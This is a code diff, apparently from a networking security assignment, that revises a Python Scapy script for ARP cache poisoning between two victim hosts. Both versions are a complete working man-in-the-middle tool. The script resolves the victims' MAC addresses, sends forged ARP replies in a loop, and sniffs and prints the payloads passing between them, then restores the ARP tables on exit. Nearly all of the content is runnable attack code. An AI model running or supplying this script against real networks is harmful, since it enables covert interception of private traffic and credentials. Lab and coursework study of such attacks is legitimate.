@@ -1,180 +1,235 @@
-from scapy.all import IP
-import sys
-from scapy.all import ARP, Ether, srp, conf
-from scapy.all import send
-import time
-from scapy.all import ARP, Ether, srp, send, sniff, IP, conf, sendp
+#!/usr/bin/env python3
 
+import sys
+import time
+import os
+import signal
+import threading
+from scapy.all import ARP, Ether, srp, sendp, sniff, conf, get_if_hwaddr, IP, Raw
 
 # --- Configuration ---
-# It's good practice to define the attacker's interface.
 # Based on the assignment, the attacker is on 'eth0'.
 ATTACKER_INTERFACE = "eth0"
-conf.verb = 0  # Make Scapy less verbose
+conf.verb = 0  # Make Scapy less verbose globally
 
+# --- Global Variables for Targets and Attacker Info ---
+# These will be populated in main()
+victim1_ip_global = ""
+victim2_ip_global = ""
+victim1_mac_global = ""
+victim2_mac_global = ""
+attacker_mac_global = ""
 
-def spoof_arp(victim_ip, victim_mac, spoof_ip):
-    """
-    Sends a crafted ARP reply to victim_ip, making them think spoof_ip is at attacker's MAC.
-    """
-    arp_reply = ARP(
-        op=2,                  # ARP reply
-        pdst=victim_ip,        # Destination IP (victim)
-        hwdst=victim_mac,      # Destination MAC (victim's MAC)
-        psrc=spoof_ip          # Source IP (spoofed: "I am this IP")
-        # hwsrc is auto-filled as attacker's MAC
-    )
-    # send(arp_reply, iface=ATTACKER_INTERFACE, verbose=False)
-    # Wrap the ARP reply in an Ethernet frame with the victim's MAC as the destination
-    ethernet_frame = Ether(dst=victim_mac) / arp_reply
+# --- Threading Control ---
+stop_event = threading.Event() # Used to signal threads to stop
+sniffer_thread_instance = None # To hold the sniffer thread object
 
-    # Send the Ethernet frame
-    sendp(ethernet_frame, iface=ATTACKER_INTERFACE, verbose=False)
-
+# --- Functions ---
 
 def get_mac(ip_address):
     """
     Sends an ARP request to the given IP address and returns its MAC address.
+    Uses the global ATTACKER_INTERFACE.
     """
     print(f"[*] Attempting to get MAC address for IP: {ip_address}")
-    # Craft an ARP request packet.
-    # Ether(dst="ff:ff:ff:ff:ff:ff") specifies the broadcast MAC address for the Ethernet frame.
-    # ARP(pdst=ip_address) specifies the target IP address in the ARP payload.
     arp_request_packet = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_address)
-
-    # srp() sends and receives packets at layer 2.
-    # - arp_request_packet: the packet to send.
-    # - timeout: how long to wait for a response (in seconds).
-    # - iface: the network interface to send the packet from.
-    # - verbose: False to suppress Scapy's default output.
-    # - conf.verb = 0 (set globally) also helps keep Scapy quiet.
-    # srp returns two lists: (answered_packets, unanswered_packets)
-    answered_packets, _ = srp(
-        arp_request_packet, timeout=2, iface=ATTACKER_INTERFACE, verbose=False)
+    answered_packets, _ = srp(arp_request_packet, timeout=2, iface=ATTACKER_INTERFACE, verbose=False)
 
     if answered_packets:
-        # The MAC address is in the 'hwsrc' (hardware source) field of the received ARP packet.
-        # answered_packets[0] is the first (and likely only) pair of (sent_packet, received_packet).
-        # answered_packets[0][1] is the received_packet.
-        # answered_packets[0][1][ARP].hwsrc is the MAC address from the ARP layer of the received packet.
-        # Or, more simply, answered_packets[0][1].hwsrc if the received packet is an ARP reply.
         return answered_packets[0][1].hwsrc
     else:
-        print(
-            f"[!] Could not get MAC address for {ip_address}. Host may be down or unresponsive.")
+        print(f"[!] Could not get MAC address for {ip_address}. Host may be down or unresponsive.")
         return None
 
-
-def packet_callback(packet):
+def spoof_arp_cache(target_ip, target_mac, spoof_ip):
     """
-    Called for every sniffed packet. Prints details if it's between the two victims.
+    Sends a single spoofed ARP reply to the target.
+    - target_ip: The IP address of the machine whose cache we want to poison.
+    - target_mac: The MAC address of that target machine.
+    - spoof_ip: The IP address that the attacker wants to impersonate for the target.
+    Uses global ATTACKER_INTERFACE and attacker_mac_global.
     """
-    if packet.haslayer(IP):
-        ip_layer = packet[IP]
-        src = ip_layer.src
-        dst = ip_layer.dst
+    packet = Ether(src=attacker_mac_global, dst=target_mac) / \
+             ARP(hwsrc=attacker_mac_global, psrc=spoof_ip,
+                 hwdst=target_mac, pdst=target_ip,
+                 op=2)  # op=2 means ARP reply
+    sendp(packet, iface=ATTACKER_INTERFACE, verbose=False)
 
-        # Only care about traffic between victim1 and victim2
-        if (src == victim1_ip and dst == victim2_ip) or (src == victim2_ip and dst == victim1_ip):
-            # Try to print the raw payload of the last layer
-            payload = bytes(ip_layer.payload)
-            print(f"Received traffic from {src} to {dst}: {payload}")
-
-
-def restore_arp(victim_ip, victim_mac, source_ip, source_mac):
+def restore_arp_tables():
     """
-    Restores the ARP table for victim_ip by sending a legitimate ARP reply
-    telling it the true MAC (source_mac) for source_ip.
+    Restores the ARP tables of the two victim machines by sending legitimate ARP replies.
+    Uses global variables for IPs and MACs.
     """
-    arp_restore_packet = Ether(dst=victim_mac, src=source_mac) / \
-        ARP(op=2,                  # ARP reply
-            pdst=victim_ip,        # Victim's IP
-            hwdst=victim_mac,      # Victim's MAC
-            # The OTHER victim's IP (real source)
-            psrc=source_ip,
-            # The OTHER victim's MAC (real MAC for that IP)
-            hwsrc=source_mac)
-    sendp(arp_restore_packet, iface=ATTACKER_INTERFACE,
-          count=4, inter=0.2, verbose=False)
-    print(
-        f"[*] Sent ARP restore to {victim_ip}: {source_ip} IS-AT {source_mac}")
+    print("\n[*] Restoring ARP tables...")
+    # Restore for Victim 1: Tell Victim 1 the true MAC of Victim 2
+    if victim1_ip_global and victim1_mac_global and victim2_ip_global and victim2_mac_global:
+        restore_packet_v1 = Ether(src=victim2_mac_global, dst=victim1_mac_global) / \
+                            ARP(hwsrc=victim2_mac_global, psrc=victim2_ip_global,
+                                hwdst=victim1_mac_global, pdst=victim1_ip_global,
+                                op=2)
+        sendp(restore_packet_v1, iface=ATTACKER_INTERFACE, count=4, inter=0.3, verbose=False)
 
+        # Restore for Victim 2: Tell Victim 2 the true MAC of Victim 1
+        restore_packet_v2 = Ether(src=victim1_mac_global, dst=victim2_mac_global) / \
+                            ARP(hwsrc=victim1_mac_global, psrc=victim1_ip_global,
+                                hwdst=victim2_mac_global, pdst=victim2_ip_global,
+                                op=2)
+        sendp(restore_packet_v2, iface=ATTACKER_INTERFACE, count=4, inter=0.3, verbose=False)
+        print("[*] ARP tables restored.")
+    else:
+        print("[!] Could not restore ARP tables: Missing IP/MAC information.")
+
+def enable_ip_forwarding():
+    """Enables IP forwarding on the system."""
+    print("[*] Enabling IP forwarding...")
+    # Using /proc filesystem to enable IP forwarding
+    # This requires root privileges.
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write("1")
+    except IOError as e:
+        print(f"[!] Failed to enable IP forwarding: {e}. Ensure you have root privileges.")
+        # If we can't forward, the MiTM attack won't fully work.
+        # Depending on strictness, might want to exit. For now, just warn.
+
+def disable_ip_forwarding():
+    """Disables IP forwarding on the system."""
+    print("[*] Disabling IP forwarding...")
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write("0")
+    except IOError as e:
+        print(f"[!] Failed to disable IP forwarding: {e}.")
+
+
+def packet_sniffer_callback(packet):
+    """
+    Callback function for Scapy's sniff(). Processes captured packets.
+    Prints IP source, destination, and payload if the packet is between the targets.
+    """
+    if not stop_event.is_set(): # Only process if we are not trying to stop
+        if IP in packet:
+            source_ip = packet[IP].src
+            destination_ip = packet[IP].dst
+
+            # Check if the packet is flowing between our two victim IPs
+            is_v1_to_v2 = (source_ip == victim1_ip_global and destination_ip == victim2_ip_global)
+            is_v2_to_v1 = (source_ip == victim2_ip_global and destination_ip == victim1_ip_global)
+
+            if is_v1_to_v2 or is_v2_to_v1:
+                payload_data = b''  # Default to empty bytes
+                if Raw in packet:   # Check if there is a Raw layer (payload)
+                    payload_data = packet[Raw].load
+                # Output format: Received traffic from 192.168.124.20 to 192.168.124.10: b'Hi!'
+                print(f"Received traffic from {source_ip} to {destination_ip}: {payload_data!r}")
+
+
+def start_packet_sniffing():
+    """
+    Starts the packet sniffing process in the current thread.
+    Uses the global stop_event to allow for graceful shutdown.
+    """
+    print("[*] Starting packet sniffing...")
+    # sniff() will block until stop_filter returns True or count is reached.
+    # store=0 means we don't keep packets in memory, relying on the callback.
+    sniff(iface=ATTACKER_INTERFACE,
+          prn=packet_sniffer_callback,
+          stop_filter=lambda p: stop_event.is_set(), # Stop sniffing when event is set
+          store=0)
+    print("[*] Packet sniffing stopped.")
+
+
+def signal_handler(sig, frame):
+    """Handles Ctrl+C and other termination signals."""
+    print(f"\n[!] Signal {sig} received. Shutting down gracefully...")
+    stop_event.set() # Signal all threads/loops to stop
+
+    # The main thread will join the sniffer thread after the spoofing loop breaks.
+    # Restoration and IP forwarding disable will happen in the main try/finally.
 
 def main():
-    # Check if the correct number of command line arguments are provided
+    global victim1_ip_global, victim2_ip_global, victim1_mac_global, victim2_mac_global
+    global attacker_mac_global, ATTACKER_INTERFACE, sniffer_thread_instance
+
+    # Register signal handlers for graceful shutdown
+    signal.signal(signal.SIGINT, signal_handler)  # Ctrl+C
+    signal.signal(signal.SIGTERM, signal_handler) # Termination signal
+
+    # Check for root privileges (necessary for raw sockets and IP forwarding)
+    if os.geteuid() != 0:
+        print("[!] This script requires root privileges to run.")
+        sys.exit(1)
+
+    # Check command line arguments
     if len(sys.argv) != 3:
         print("Error: Incorrect Usage!")
-        print("Usage: python3 spoof_arp.py <victim1_ip> <victim2_ip>")
+        print(f"Usage: python3 {sys.argv[0]} <victim1_ip> <victim2_ip>")
         sys.exit(1)
 
-    # Get the IP addresses of the victims from command line arguments
-    global victim1_ip, victim2_ip
-    victim1_ip = sys.argv[1]
-    victim2_ip = sys.argv[2]
+    victim1_ip_global = sys.argv[1]
+    victim2_ip_global = sys.argv[2]
 
-    # Print the IP addresses of the victims
-    print(f"Victim 1 IP: {victim1_ip}")
-    print(f"Victim 2 IP: {victim2_ip}")
+    print(f"Attacker Interface: {ATTACKER_INTERFACE}")
+    print(f"Victim 1 IP: {victim1_ip_global}")
+    print(f"Victim 2 IP: {victim2_ip_global}")
 
-    # Get the MAC addresses of the victims
-    victim1_mac = get_mac(victim1_ip)
-    victim2_mac = get_mac(victim2_ip)
-
-    # Check if the MAC addresses were successfully retrieved
-    if not victim1_mac or not victim2_mac:
-        print("Error: Failed to get MAC addresses. Exiting...")
+    # Get MAC addresses
+    attacker_mac_global = get_if_hwaddr(ATTACKER_INTERFACE)
+    if not attacker_mac_global:
+        print(f"[!] Could not get MAC address for attacker interface {ATTACKER_INTERFACE}. Exiting.")
         sys.exit(1)
+    print(f"Attacker MAC: {attacker_mac_global}")
 
-    # Print the MAC addresses of the victims
-    print(f"Victim 1 MAC: {victim1_mac}")
-    print(f"Victim 2 MAC: {victim2_mac}")
+    victim1_mac_global = get_mac(victim1_ip_global)
+    victim2_mac_global = get_mac(victim2_ip_global)
 
-    print("[*] Starting ARP spoofing... Press Ctrl+C to stop and restore tables.")
+    if not victim1_mac_global or not victim2_mac_global:
+        print("[!] Failed to obtain MAC addresses for one or both victims. Exiting.")
+        sys.exit(1)
+    print(f"Victim 1 MAC: {victim1_mac_global}")
+    print(f"Victim 2 MAC: {victim2_mac_global}")
+
+    # enable_ip_forwarding()
+
     try:
-        while True:
-            # Spoof ARP for both victims
-            spoof_arp(victim1_ip, victim1_mac, victim2_ip)
-            spoof_arp(victim2_ip, victim2_mac, victim1_ip)
-            time.sleep(2)
+        # Start packet sniffing in a separate thread
+        sniffer_thread_instance = threading.Thread(target=start_packet_sniffing)
+        sniffer_thread_instance.daemon = True # Allow main program to exit if this thread is still running
+        sniffer_thread_instance.start()
 
-    except KeyboardInterrupt:
-        print("\n[!] Ctrl+C detected.")
-        print("[*] Restoring ARP tables...")
-        restore_arp(victim1_ip, victim1_mac, victim2_ip,
-                    victim2_mac)
-        restore_arp(victim2_ip, victim2_mac, victim1_ip,
-                    victim1_mac)
-        print("[*] ARP tables restored.")
-        sys.exit(0)
+        print("\n[*] Starting ARP spoofing loop... Press Ctrl+C to stop.")
+        packets_sent_count = 0
+        while not stop_event.is_set():
+            spoof_arp_cache(victim1_ip_global, victim1_mac_global, victim2_ip_global)
+            spoof_arp_cache(victim2_ip_global, victim2_mac_global, victim1_ip_global)
+            packets_sent_count += 2
+            # \r moves cursor to line start, end='' prevents newline. Updates in place.
+            print(f"\r[*] ARP Spoofing Active. Packets Sent: {packets_sent_count}", end="")
 
-    # try:
-    #     # Start a background thread to continuously poison
-    #     import threading
+            # Sleep for a bit, but check stop_event frequently.
+            # stop_event.wait returns True if event set, False on timeout.
+            if stop_event.wait(timeout=2.0): # Timeout is 2 seconds
+                break # Event was set, break from loop
 
-    #     def poison_loop():
-    #         while True:
-    #             spoof_arp(victim1_ip, victim1_mac, victim2_ip)
-    #             spoof_arp(victim2_ip, victim2_mac, victim1_ip)
-    #             time.sleep(2)
+    except Exception as e:
+        # This catches unexpected errors during the main spoofing loop.
+        print(f"\n[!] An unexpected error occurred: {e}")
+    finally:
+        print("\n[*] Initiating cleanup sequence...")
+        # Signal stop_event again just in case it wasn't (e.g., loop broke due to error)
+        if not stop_event.is_set():
+            stop_event.set()
 
-    #     poison_thread = threading.Thread(target=poison_loop)
-    #     poison_thread.daemon = True
-    #     poison_thread.start()
+        # Wait for the sniffer thread to finish
+        if sniffer_thread_instance and sniffer_thread_instance.is_alive():
+            print("[*] Waiting for sniffer thread to complete...")
+            sniffer_thread_instance.join(timeout=5.0) # Wait up to 5 seconds
+            if sniffer_thread_instance.is_alive():
+                print("[!] Sniffer thread did not terminate gracefully.")
 
-    #     # Now start sniffing packets (main thread)
-    #     print("[*] Sniffing traffic between victims...")
-    #     sniff(iface=ATTACKER_INTERFACE, prn=packet_callback, store=0)
-
-    # except KeyboardInterrupt:
-    #     print("\n[!] Ctrl+C detected.")
-    #     print("[*] Restoring ARP tables...")
-        # restore_arp(victim1_ip, victim1_mac, victim2_ip,
-        # victim2_mac)
-        # restore_arp(victim2_ip, victim2_mac, victim1_ip,
-        # victim1_mac)
-        # print("[*] ARP tables restored.")
-        # sys.exit(0)
-
+        restore_arp_tables()
+        # disable_ip_forwarding()
+        print("[*] Cleanup complete. Exiting.")
 
 if __name__ == "__main__":
     main()
